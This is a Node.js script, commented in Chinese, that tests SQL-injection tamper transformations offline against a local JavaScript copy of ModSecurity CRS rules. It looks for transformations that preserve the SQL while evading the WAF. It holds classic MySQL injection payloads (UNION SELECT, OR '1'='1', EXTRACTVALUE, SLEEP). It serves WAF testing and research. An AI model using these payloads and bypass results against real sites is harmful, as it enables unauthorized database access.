#!/usr/bin/env node
/**
 * waf-semantic-screen.mjs —— 离线筛选「语义保持 × CRS 放行」的变换族。
 *
 * 背景（真机数据，2026-09/10 四轮 ModSecurity CRS 实测）：
 *   真机打穿只有 1 个插件 / 2-19 条；编码族（encode2hex 等）**放行 19/19 但打穿 0/19**
 *   —— 变形把 SQL 语义破坏了，过了 WAF 却拼不出可执行的 SQL。
 *   而语义保持类（symboliclogical 的 && / ||）又被 CRS 942120 直接拦（EVIDENCE.CRS_NEGATIVE）。
 *   ⇒ 出路不是再堆 tamper，而是先**离线**找出「既保持 SQL 语义、又能过 CRS」的族。
 *
 * 本脚本做的事（纯本地、无网络、无 DB）：
 *   对每个 `CORE_SEMANTICS` 族 → applyTampers 变换基线 payload → 送本地 CRS 执行器
 *   （crs-engine.js，ModSecurity 规则的 JS 复现）判 PL1 / PL3 是否放行。
 *
 * ⚠️ 口径纪律（别把这份报告误用）：
 *   1. **「放行」≠「打穿」**。放行只说明没被 CRS 拦；SQL 是否真能执行、能否吐出证据，
 *      只有真机（owasp/modsecurity-crs:nginx + 真 MySQL）能判，本脚本不产出该结论。
 *   2. 执行器是规则的**JS 复现**，与真 ModSecurity 的一致率由 `npm run waf-fidelity` 守
 *      （942 家族当前 99.6%），且只覆盖 query / 表单 body（XML 接口未覆盖）。
 *   3. category 的「语义保持」判定来自 `CORE_SEMANTICS` 的**人工精标**，不是本脚本实测。
 *
 * 用法：
 *   node scripts/waf-semantic-screen.mjs [--base=<payload>] [--pl=1,3] [--family=942]
 */
import { resolve, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, '..');
const E2E = resolve(ROOT, 'e2e/waf-real');

const argv = process.argv.slice(2);
const arg = (k, d) => (argv.find((a) => a.startsWith(`--${k}=`)) || '').slice(k + 3) || d;
// 基线候选：**必须**在目标档位被拦 —— 基线自己都放行的话，「变换后放行」说明不了任何事
// （首次跑就踩了这个坑：`1' AND 1=1-- -` 在 PL1 本就放行 ⇒ 全表「放行」无意义）。
// 故逐一试候选，取第一个「各档均被拦」的；都不被拦 ⇒ 拒绝产出报告（fail-closed）。
const CANDIDATES = [
  arg('base', ''),
  "-1' UNION SELECT 1,2,3-- -",
  "1' OR '1'='1",
  "1 AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))",
  "1' AND SLEEP(5)-- -",
].filter(Boolean);
const PLS = arg('pl', '1,3').split(',').map(Number);
const FAMILY = arg('family', '942');

const CONF = { 942: 'crs/REQUEST-942-SQLI.conf', 930: 'crs/REQUEST-930.conf' }[FAMILY];
if (!CONF) throw new Error(`未知族 ${FAMILY}`);

const { evaluate } = await import(pathToFileURL(resolve(E2E, 'crs-engine.js')).href);
const { applyTampers } = await import(
  pathToFileURL(resolve(ROOT, 'server/src/core/tamper/applyTampers.js')).href
);
const { CORE_SEMANTICS, SEMANTIC_CATEGORIES } = await import(
  pathToFileURL(resolve(ROOT, 'server/src/core/waf/bypass/semantics.js')).href
);

// 按 ModSecurity 口径：args 留**原文**，解码交给规则自己的 t:urlDecodeUni（crs-equivalence 同款）
function rawPairs(s) {
  const out = {};
  for (const kv of String(s).split('&')) {
    const i = kv.indexOf('=');
    if (i > 0) out[kv.slice(0, i)] = kv.slice(i + 1);
    else if (kv) out[kv] = '';
  }
  return out;
}

function toReq(value) {
  const qs = `id=${value}`;
  return {
    method: 'GET',
    uri: `/item.php?${qs}`,
    queryString: qs,
    args: rawPairs(qs),
    cookies: {},
    headers: {},
  };
}

function blocked(value, pl) {
  // confPath 由 crs-engine 按 **cwd 相对**解析 ⇒ 必须给绝对路径（本项目从仓库根跑脚本）
  const r = evaluate(toReq(value), {
    paranoiaLevel: pl,
    collectAll: true,
    confPath: resolve(E2E, CONF),
  });
  return Boolean(r && (r.blocked || r.matched));
}

// 类别 → 是否「语义保持」（按 SEMANTIC_CATEGORIES 的定义；ENCODING 改变的是传输层表示）
const PRESERVING = new Set([
  SEMANTIC_CATEGORIES.SYNTACTIC,
  SEMANTIC_CATEGORIES.LEXICAL,
  SEMANTIC_CATEGORIES.WHITESPACE,
  SEMANTIC_CATEGORIES.LITERAL,
]);

// 选基线：各档均被拦的第一个候选
let BASE = null;
const baseBlocked = {};
for (const cand of CANDIDATES) {
  const per = {};
  for (const pl of PLS) per[pl] = blocked(cand, pl);
  const allBlocked = PLS.every((pl) => per[pl]);
  console.log(`基线候选 ${JSON.stringify(cand)}：${PLS.map((pl) => `PL${pl}=${per[pl] ? '拦' : '放行'}`).join(' / ')}${allBlocked ? '  ← 采用' : ''}`);
  if (allBlocked && !BASE) { BASE = cand; Object.assign(baseBlocked, per); }
}
if (!BASE) {
  console.error('\n✗ 没有任何基线候选在各档都被拦 —— 换更强的 payload 或调 --pl，拒绝产出无意义的报告。');
  process.exit(1);
}

const rows = [];
for (const [name, meta] of Object.entries(CORE_SEMANTICS)) {
  let out = null;
  try {
    out = applyTampers(BASE, { dbms: 'mysql' }, [name]);
  } catch (e) {
    rows.push({ name, category: meta.category, err: String(e.message).slice(0, 60) });
    continue;
  }
  const value = typeof out === 'string' ? out : out?.value ?? String(out);
  const verdict = {};
  for (const pl of PLS) verdict[pl] = blocked(value, pl);
  rows.push({
    name,
    category: meta.category,
    preserving: PRESERVING.has(meta.category),
    changed: value !== BASE,
    verdict,
    evidence: meta.evidence || '',
    sample: value.length > 60 ? `${value.slice(0, 57)}…` : value,
  });
}

const pass = (r) => PLS.every((pl) => r.verdict && r.verdict[pl] === false);
const winners = rows.filter((r) => r.changed && r.preserving && pass(r));

console.log(`基线：${JSON.stringify(BASE)}`);
console.log(`基线是否被拦：${PLS.map((pl) => `PL${pl}=${baseBlocked[pl] ? '拦' : '放行'}`).join(' / ')}`);
console.log(`族总数 ${rows.length}；语义保持且各档均放行的：${winners.length}\n`);
console.log('族'.padEnd(20), '类别'.padEnd(12), PLS.map((pl) => `PL${pl}`).join('  '), ' 证据');
for (const r of rows) {
  if (r.err) { console.log(r.name.padEnd(20), 'ERROR'.padEnd(12), r.err); continue; }
  const v = PLS.map((pl) => (r.verdict[pl] ? '拦' : '放行').padEnd(5)).join(' ');
  const mark = r.changed && r.preserving && pass(r) ? '★' : ' ';
  console.log(
    mark + r.name.padEnd(19),
    String(r.category).padEnd(12),
    v,
    r.evidence ? ` [${r.evidence}]` : '',
  );
}
console.log('\n★ = 语义保持 + 各档均放行（候选，需要真机验证「打穿」才能对外引用）');
console.log(`样本：${winners.slice(0, 5).map((r) => `${r.name}=>${r.sample}`).join(' | ') || '（无）'}`);
